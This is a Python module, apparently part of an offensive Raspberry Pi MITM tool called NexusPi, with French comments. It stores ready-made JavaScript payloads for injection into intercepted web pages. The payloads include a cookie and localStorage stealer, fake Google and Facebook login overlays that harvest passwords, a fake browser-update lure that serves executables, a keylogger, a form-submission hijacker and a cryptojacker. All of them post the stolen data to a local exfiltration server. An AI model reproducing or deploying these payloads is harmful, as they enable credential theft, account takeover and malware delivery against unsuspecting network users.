"""
NexusPi — payloads JavaScript prédéfinis pour injection MITM.

Chaque preset est un snippet de JS injecté avant </body> par mitm_inject.py
(HTTP) ou mitmproxy_inject.py (HTTPS).

Convention exfil : les payloads qui veulent renvoyer des données POSTent
vers http://192.168.99.1:8081/exfil avec un body JSON. Un petit serveur
HTTP (captive_portal.py en mode "exfil") tourne sur 8081 en modes MITM.

Limitations :
- Pas d'exécution sur les sites mainstream tant qu'on n'a pas le cert root
  installé (98% du web est en HTTPS).
- Beaucoup de sites ont CSP (Content-Security-Policy) qui empêchent
  l'exécution de <script> inline injecté — l'injection passera silencieusement.
  Marche bien sur les sites mal configurés ou des pages HTTP simples.
"""


# Endpoint exfil (le captive_portal.py en mode exfil écoute là)
EXFIL_URL = "http://192.168.99.1:8081/exfil"


# ── 1. Démonstration basique ────────────────────────────────────────────────

ALERT = "alert('NexusPi MITM — démonstration');"


# ── 2. Hijack de page : remplace le contenu par un écran noir avec message ──

PAGE_HIJACK = (
    "document.body.innerHTML='"
    "<div style=\"position:fixed;inset:0;background:#000;color:#0f0;"
    "font:18px monospace;padding:40px;z-index:999999;overflow:auto\">"
    "<h1 style=\"font-size:36px;margin-bottom:20px\">⚠ SYSTÈME COMPROMIS</h1>"
    "<p>NexusPi a intercepté votre connexion WiFi.</p>"
    "<p>Tous vos cookies, sessions et identifiants sont exposés.</p>"
    "<p style=\"margin-top:30px;color:#ff0;font-size:14px\">"
    "[Démonstration — aucune donnée exfiltrée hors du Pi]</p>"
    "</div>';"
)


# ── 3. Vol de cookies + localStorage de la page courante ────────────────────

COOKIE_STEALER = (
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'cookies',url:location.href,"
    "domain:location.hostname,cookies:document.cookie,"
    "localStorage:Object.fromEntries(Object.entries(localStorage))}),"
    "headers:{'Content-Type':'application/json'}});"
)


# ── 4. Phishing Google (overlay full-screen ressemblant à la page Google) ───

GOOGLE_PHISHING = (
    "(function(){"
    "const o=document.createElement('div');"
    "o.style.cssText='position:fixed;inset:0;background:white;z-index:999999;"
    "display:flex;align-items:center;justify-content:center;"
    "font-family:Roboto,Arial,sans-serif';"
    "o.innerHTML='"
    "<div style=\"max-width:400px;width:90%;padding:48px 40px;"
    "border:1px solid #dadce0;border-radius:8px\">"
    "<div style=\"text-align:center;margin-bottom:24px;font-size:48px;"
    "font-weight:bold\">"
    "<span style=\"color:#4285F4\">G</span>"
    "<span style=\"color:#EA4335\">o</span>"
    "<span style=\"color:#FBBC05\">o</span>"
    "<span style=\"color:#4285F4\">g</span>"
    "<span style=\"color:#34A853\">l</span>"
    "<span style=\"color:#EA4335\">e</span>"
    "</div>"
    "<h1 style=\"text-align:center;font-size:24px;font-weight:400;"
    "margin-bottom:8px;color:#202124\">Re-connexion</h1>"
    "<p style=\"text-align:center;color:#5f6368;font-size:14px;"
    "margin-bottom:32px\">Votre session a expiré.<br>"
    "Veuillez vous re-identifier pour continuer.</p>"
    "<input id=\"np_e\" type=\"email\" placeholder=\"Email ou téléphone\" "
    "style=\"width:100%;padding:13px;margin:6px 0;border:1px solid #dadce0;"
    "border-radius:4px;font-size:16px;box-sizing:border-box\">"
    "<input id=\"np_p\" type=\"password\" placeholder=\"Mot de passe\" "
    "style=\"width:100%;padding:13px;margin:6px 0;border:1px solid #dadce0;"
    "border-radius:4px;font-size:16px;box-sizing:border-box\">"
    "<div style=\"text-align:right;margin-top:24px\">"
    "<button id=\"np_b\" style=\"background:#1a73e8;color:white;border:none;"
    "padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;"
    "cursor:pointer\">Suivant</button></div></div>';"
    "document.body.appendChild(o);"
    "document.getElementById('np_b').onclick=function(){"
    "const e=document.getElementById('np_e').value;"
    "const p=document.getElementById('np_p').value;"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'phishing_google',email:e,password:p,"
    "url:location.href}),headers:{'Content-Type':'application/json'}})"
    ".finally(()=>{o.innerHTML='<p style=\"font-size:18px;color:#5f6368\">"
    "Connexion en cours…</p>';setTimeout(()=>o.remove(),1500)});};})();"
)


# ── 5. Phishing Facebook ────────────────────────────────────────────────────

FACEBOOK_PHISHING = (
    "(function(){"
    "const o=document.createElement('div');"
    "o.style.cssText='position:fixed;inset:0;background:#f0f2f5;z-index:999999;"
    "display:flex;align-items:center;justify-content:center;"
    "font-family:Helvetica,Arial,sans-serif';"
    "o.innerHTML='"
    "<div style=\"max-width:396px;width:90%;background:white;padding:24px;"
    "border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1)\">"
    "<div style=\"text-align:center;font-size:48px;color:#1877f2;"
    "font-weight:bold;font-family:Helvetica;margin-bottom:20px\">facebook</div>"
    "<input id=\"np_e\" placeholder=\"Email ou tel\" "
    "style=\"width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;"
    "border-radius:6px;font-size:17px;box-sizing:border-box\">"
    "<input id=\"np_p\" type=\"password\" placeholder=\"Mot de passe\" "
    "style=\"width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;"
    "border-radius:6px;font-size:17px;box-sizing:border-box\">"
    "<button id=\"np_b\" style=\"width:100%;background:#1877f2;color:white;"
    "border:none;padding:12px;border-radius:6px;font-size:20px;font-weight:bold;"
    "cursor:pointer;margin-top:6px\">Se connecter</button>"
    "<p style=\"text-align:center;margin-top:16px;font-size:14px;color:#1877f2\">"
    "Mot de passe oublié ?</p></div>';"
    "document.body.appendChild(o);"
    "document.getElementById('np_b').onclick=function(){"
    "const e=document.getElementById('np_e').value;"
    "const p=document.getElementById('np_p').value;"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'phishing_facebook',email:e,password:p,"
    "url:location.href}),headers:{'Content-Type':'application/json'}})"
    ".finally(()=>{o.innerHTML='<p>Connexion…</p>';"
    "setTimeout(()=>o.remove(),1500)});};})();"
)


# ── 6. Fausse mise à jour navigateur (lien APK/EXE) ─────────────────────────

FAKE_UPDATE = (
    "(function(){"
    "const ua=navigator.userAgent;"
    "const isA=/Android/i.test(ua);const isW=/Windows/i.test(ua);"
    "const isI=/iPhone|iPad/i.test(ua);"
    "const file=isA?'chrome-update.apk':isW?'chrome-update.exe':"
    "isI?'safari-update.ipa':'browser-update.bin';"
    "const dlUrl='http://192.168.99.1:8081/dl/'+file;"
    "const o=document.createElement('div');"
    "o.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.85);"
    "z-index:999999;display:flex;align-items:center;justify-content:center;"
    "font-family:Arial,sans-serif';"
    "o.innerHTML='"
    "<div style=\"background:white;max-width:480px;width:90%;padding:32px;"
    "border-radius:8px;text-align:center\">"
    "<div style=\"font-size:64px;margin-bottom:8px\">⚠</div>"
    "<h2 style=\"color:#d93025;margin:16px 0 8px;font-size:22px\">"
    "Mise à jour critique requise</h2>"
    "<p style=\"color:#5f6368;margin-bottom:24px;line-height:1.5;font-size:14px\">"
    "Votre navigateur est obsolète et vulnérable.<br>"
    "Cliquez pour installer la dernière version sécurisée.</p>"
    "<a id=\"np_dl\" href=\"'+dlUrl+'\" download "
    "style=\"display:inline-block;background:#1a73e8;color:white;padding:14px 32px;"
    "border-radius:6px;text-decoration:none;font-weight:500;font-size:15px\">"
    "Installer maintenant</a>"
    "<p style=\"font-size:12px;color:#9aa5b1;margin-top:16px\">"
    "Cette mise à jour vous protège contre les nouvelles menaces.</p></div>';"
    "document.body.appendChild(o);"
    "document.getElementById('np_dl').onclick=function(){"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'fake_update_click',target_file:file,"
    "ua:ua,url:location.href}),headers:{'Content-Type':'application/json'}});"
    "setTimeout(()=>{o.innerHTML='<p style=\"color:white;font-size:18px\">"
    "Téléchargement en cours…</p>';setTimeout(()=>o.remove(),2500);},800);};})();"
)


# ── 9. Cryptojacker — VRAI proof-of-work SHA-256 via SubtleCrypto ──────────
# Utilise l'API crypto native du navigateur (SubtleCrypto.digest('SHA-256'))
# pour calculer de VRAIS hashes cryptographiques. Le hashrate rapporté
# correspond à du travail PoW réel — vérifiable côté victime (CPU à 100%).
#
# Pour devenir un VRAI miner Monero, il faudrait :
#   1. Connexion WebSocket vers un pool stratum
#   2. Protocole stratum (login / get_job / submit_share)
#   3. Algo RandomX (256 MB scratchpad → quasi impossible en browser)
# En 2024, le vrai mining browser de Monero est techniquement mort.
# Ce preset démontre la technique sans payer un vrai pool.

CRYPTOJACKER_REAL = (
    "(function(){"
    "const seed=Math.random().toString(36)+Date.now();"
    "const code=`"
    "self.onmessage=async function(e){"
    "let nonce=0,lastRep=Date.now(),hashes=0,lastHash='';"
    "const seed=e.data.seed,wid=e.data.wid;"
    "while(true){"
    "const input=seed+':'+wid+':'+nonce;"
    "const buf=new TextEncoder().encode(input);"
    "const hash=await crypto.subtle.digest('SHA-256',buf);"
    "const arr=new Uint8Array(hash);"
    "lastHash='';"
    "for(let i=0;i<8;i++){lastHash+=arr[i].toString(16).padStart(2,'0');}"
    "hashes++;nonce++;"
    "const now=Date.now();"
    "if(now-lastRep>=5000){"
    "self.postMessage({hps:Math.round(hashes/((now-lastRep)/1000)),"
    "nonce:nonce,sample:lastHash});"
    "hashes=0;lastRep=now;}}};"
    "`;"
    "const cores=navigator.hardwareConcurrency||2;"
    "for(let i=0;i<cores;i++){"
    "const w=new Worker(URL.createObjectURL("
    "new Blob([code],{type:'application/javascript'})));"
    "w.onmessage=function(ev){"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'cryptojacker',worker:i,total_workers:cores,"
    "hashrate_hps:ev.data.hps,total_nonce:ev.data.nonce,"
    "sample_hash:ev.data.sample,ua:navigator.userAgent}),"
    "headers:{'Content-Type':'application/json'}})};"
    "w.postMessage({seed:seed,wid:i});}"
    "})();"
)


# ── 7. Keylogger sur tous les <input> de la page ────────────────────────────

KEYLOGGER = (
    "(function(){"
    "function attach(els){els.forEach(function(i){"
    "if(i.dataset.np)return;i.dataset.np='1';"
    "i.addEventListener('input',function(){"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'keystroke',"
    "name:this.name||this.id||this.placeholder||'?',"
    "input_type:this.type||'text',"
    "value:this.value,url:location.href,title:document.title}),"
    "headers:{'Content-Type':'application/json'}})});});}"
    "attach(document.querySelectorAll('input,textarea'));"
    # MutationObserver pour catch les inputs créés dynamiquement (SPA)
    "new MutationObserver(function(ms){ms.forEach(function(m){"
    "m.addedNodes.forEach(function(n){"
    "if(n.nodeType!==1)return;"
    "if(n.matches&&n.matches('input,textarea'))attach([n]);"
    "if(n.querySelectorAll)attach(n.querySelectorAll('input,textarea'));"
    "});});}).observe(document.documentElement,{childList:true,subtree:true});"
    "})();"
)


# ── 8. Hijack des formulaires (intercepte les submits avant l'envoi) ────────

FORM_HIJACK = (
    "(function(){"
    "function attach(forms){forms.forEach(function(f){"
    "if(f.dataset.np)return;f.dataset.np='1';"
    "f.addEventListener('submit',function(e){"
    "var data={};var pwds=[];"
    "this.querySelectorAll('input,textarea,select').forEach(function(i){"
    "if(i.name){data[i.name]=i.value;"
    "if(i.type==='password')pwds.push(i.name);}});"
    f"fetch('{EXFIL_URL}',{{method:'POST',"
    "body:JSON.stringify({type:'form_submit',"
    "action:f.action||location.href,method:(f.method||'GET').toUpperCase(),"
    "fields:data,password_fields:pwds,"
    "url:location.href,title:document.title}),"
    "headers:{'Content-Type':'application/json'}});"
    "});});}"
    "attach(document.querySelectorAll('form'));"
    "new MutationObserver(function(ms){ms.forEach(function(m){"
    "m.addedNodes.forEach(function(n){"
    "if(n.nodeType!==1)return;"
    "if(n.matches&&n.matches('form'))attach([n]);"
    "if(n.querySelectorAll)attach(n.querySelectorAll('form'));"
    "});});}).observe(document.documentElement,{childList:true,subtree:true});"
    "})();"
)


# ── Registre des presets disponibles côté UI ────────────────────────────────

PRESETS = {
    "custom":            "",   # signal pour utiliser inject_script du form
    "alert":             ALERT,
    "page_hijack":       PAGE_HIJACK,
    "cookie_stealer":    COOKIE_STEALER,
    "google_phishing":   GOOGLE_PHISHING,
    "facebook_phishing": FACEBOOK_PHISHING,
    "fake_update":       FAKE_UPDATE,
    "keylogger":         KEYLOGGER,
    "form_hijack":       FORM_HIJACK,
    "cryptojacker":      CRYPTOJACKER_REAL,
}


def resolve(preset: str, custom: str = "") -> str:
    """Retourne le JS final selon le preset choisi."""
    if preset and preset != "custom":
        return PRESETS.get(preset, "")
    return custom or ""


def resolve_multi(presets_csv: str, custom: str = "") -> str:
    """Résout plusieurs presets (séparés par virgule) et les concatène."""
    if not presets_csv:
        return custom or ""
    parts = [p.strip() for p in presets_csv.split(",") if p.strip()]
    snippets = []
    for p in parts:
        if p == "custom":
            if custom and custom.strip():
                snippets.append(custom.strip())
        else:
            js = PRESETS.get(p, "")
            if js:
                snippets.append(js)
    return "\n".join(snippets)
